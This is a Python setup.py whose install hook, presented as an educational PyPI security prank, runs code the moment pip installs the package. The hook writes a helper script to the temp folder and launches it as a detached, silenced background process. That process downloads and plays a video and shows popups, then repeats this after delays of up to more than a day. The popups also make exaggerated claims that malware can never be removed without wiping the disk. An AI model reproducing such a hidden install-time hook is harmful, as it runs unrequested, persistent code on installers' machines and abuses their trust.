"""Setup script that triggers rickroll during pip install."""

import subprocess
import sys
import tempfile
import webbrowser
import time
import os
from pathlib import Path
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info


def get_helper_script():
    """Generate the helper script that runs in a separate process."""
    return '''
import subprocess
import sys
import tempfile
import time
import platform
import shutil
from pathlib import Path

def show_popup_message(title, message):
    """Display a popup message dialog to the user."""
    system = platform.system()
    
    try:
        if system == "Darwin":
            script = f'display dialog "{message}" with title "{title}" buttons {{"OK"}} default button "OK"'
            subprocess.Popen(["osascript", "-e", script])
        elif system == "Windows":
            ps_script = f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("{message}", "{title}")'
            subprocess.Popen(["powershell", "-Command", ps_script])
        else:
            for cmd in [
                ["zenity", "--info", f"--title={title}", f"--text={message}"],
                ["kdialog", "--msgbox", message, "--title", title],
                ["xmessage", "-center", f"{title}\\n\\n{message}"],
            ]:
                try:
                    subprocess.Popen(cmd)
                    return
                except FileNotFoundError:
                    continue
            print(f"\\n[POPUP] {title}: {message}\\n")
    except Exception as e:
        print(f"\\n[POPUP] {title}: {message}\\n")


def play_video_background(video_path, with_audio=False):
    """Play video in the background using system player."""
    system = platform.system()
    
    try:
        if system == "Darwin":
            if with_audio:
                subprocess.Popen(["open", str(video_path)])
            else:
                script = f"""
                tell application "QuickTime Player"
                    open POSIX file "{video_path}"
                    set audio volume of document 1 to 0
                    play document 1
                end tell
                """
                try:
                    subprocess.Popen(["osascript", "-e", script])
                except Exception:
                    subprocess.Popen(["open", str(video_path)])
        elif system == "Windows":
            if with_audio:
                subprocess.Popen(["start", "", str(video_path)], shell=True)
            else:
                try:
                    subprocess.Popen(["vlc", "--volume=0", str(video_path)])
                except FileNotFoundError:
                    subprocess.Popen(["start", "", str(video_path)], shell=True)
        else:
            if with_audio:
                subprocess.Popen(["xdg-open", str(video_path)])
            else:
                players = [
                    ["vlc", "--volume=0", str(video_path)],
                    ["mpv", "--volume=0", str(video_path)],
                    ["totem", str(video_path)],
                    ["xdg-open", str(video_path)],
                ]
                for player_cmd in players:
                    try:
                        subprocess.Popen(player_cmd)
                        return
                    except FileNotFoundError:
                        continue
    except Exception as e:
        print(f"Could not open video: {e}")


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--with-audio", action="store_true", default=False)
    parser.add_argument("--url", default="https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    args = parser.parse_args()
    
    try:
        import yt_dlp
    except ImportError:
        print("yt-dlp not available, opening in browser")
        import webbrowser
        webbrowser.open(args.url)
        time.sleep(3)
        show_popup_message(
            "Security Warning",
            "You just got rickrolled!\\n\\n"
            "This demonstrates that pip install can run arbitrary code.\\n\\n"
            "LESSON: Always verify packages before installing!"
        )
        return
    
    tmpdir = Path(tempfile.gettempdir()) / "rickroll_tmp"
    tmpdir.mkdir(exist_ok=True)
    video_path = tmpdir / "rickroll.mp4"
    
    ydl_opts = {
        "format": "best[ext=mp4][height<=720]/best[ext=mp4]/best",
        "outtmpl": str(video_path),
        "quiet": True,
        "no_warnings": True,
    }
    
    print("Downloading surprise content...")
    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        ydl.download([args.url])
    
    if not video_path.exists():
        print("Download failed")
        return
    
    persistent_path = Path(tempfile.gettempdir()) / "rickroll_surprise.mp4"
    shutil.copy2(video_path, persistent_path)
    
    print("Playing video...")
    play_video_background(str(persistent_path), with_audio=args.with_audio)
    
    time.sleep(3)
    
    show_popup_message(
        "Security Warning",
        "You just got rickrolled!\\n\\n"
        "This is an educational demonstration about PyPI security.\\n\\n"
        "When you run pip install, the packages you are installing can run"
        "arbitrary code on your system. In this case, all it did was rickroll."
        "But malicious packages could steal your bank info, send emails"
        "impersonating you, or use your computer to launch attacks on the"
        "US government.\\n\\n"
        "LESSON: Always verify packages before installing them!\\n"
        "Check the source code, verify the publisher, and be cautious "
        "with unfamiliar packages."
    )

    import random
    time.sleep(60*10 + random.random()*60*20)
    play_video_background(str(persistent_path), with_audio=args.with_audio)
    show_popup_message(
        "Remember: once someone has access to your computer for just a fraction of a second, they have access to your computer forever! There is no way to reliably get rid of malware except by totally erasing your harddrive and reinstalling."
    )

    time.sleep(60*10 + random.random()*60*20 + 24*60*60)
    play_video_background(str(persistent_path), with_audio=args.with_audio)
    show_popup_message(
        "Remember: once someone has access to your computer for just a fraction of a second, they have access to your computer forever! There is no way to reliably get rid of malware except by totally erasing your harddrive and reinstalling.\n\n(This is the last time you'll get this rickroll... I promise..."
    )


if __name__ == "__main__":
    main()
'''


def show_popup_message(title, message):
    """Display a popup message dialog to the user.
    
    Args:
        title: The window title for the popup.
        message: The message text to display.
    """
    import platform
    system = platform.system()
    
    try:
        if system == "Darwin":
            script = f'display dialog "{message}" with title "{title}" buttons {{"OK"}} default button "OK"'
            subprocess.Popen(["osascript", "-e", script])
        elif system == "Windows":
            ps_script = f'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("{message}", "{title}")'
            subprocess.Popen(["powershell", "-Command", ps_script])
        else:
            for cmd in [
                ["zenity", "--info", f"--title={title}", f"--text={message}"],
                ["kdialog", "--msgbox", message, "--title", title],
                ["xmessage", "-center", f"{title}\n\n{message}"],
            ]:
                try:
                    subprocess.Popen(cmd)
                    return
                except FileNotFoundError:
                    continue
            print(f"\n[POPUP] {title}: {message}\n")
    except Exception as e:
        print(f"\n[POPUP] {title}: {message}\n")


def rickroll(with_audio=False):
    """Never gonna give you up!
    
    Args:
        with_audio: If True, play video with audio. Default is False (muted).
    """
    print("\n" + "=" * 60)
    print("You just got rickrolled!")
    print("=" * 60)
    print("\nThis is an educational demonstration about PyPI security.")
    print("When you ran 'pip install', this package executed code on your system.")
    print("\nLesson: Always verify packages before installing them!")
    print("=" * 60 + "\n")
    
    # Write helper script to temp file
    helper_script = get_helper_script()
    script_path = Path(tempfile.gettempdir()) / "rickroll_helper.py"
    script_path.write_text(helper_script)
    
    # Launch helper script as a separate, detached process
    cmd = [sys.executable, str(script_path)]
    if with_audio:
        cmd.append("--with-audio")
    
    try:
        if sys.platform == "win32":
            # Windows: use CREATE_NEW_PROCESS_GROUP and DETACHED_PROCESS
            DETACHED_PROCESS = 0x00000008
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            subprocess.Popen(
                cmd,
                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        else:
            # Unix: use start_new_session to detach from parent
            subprocess.Popen(
                cmd,
                start_new_session=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        print("Background process started for video playback...")
    except Exception as e:
        print(f"Failed to start background process: {e}")
        # Fallback to browser
        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        try:
            webbrowser.open(url)
        except Exception:
            print(f"Open this URL: {url}")


class RickrollInstall(install):
    def run(self):
        rickroll(with_audio=False)
        install.run(self)


class RickrollDevelop(develop):
    def run(self):
        rickroll(with_audio=False)
        develop.run(self)


class RickrollEggInfo(egg_info):
    def run(self):
        rickroll(with_audio=False)
        egg_info.run(self)


setup(
    cmdclass={
        'install': RickrollInstall,
    },
)
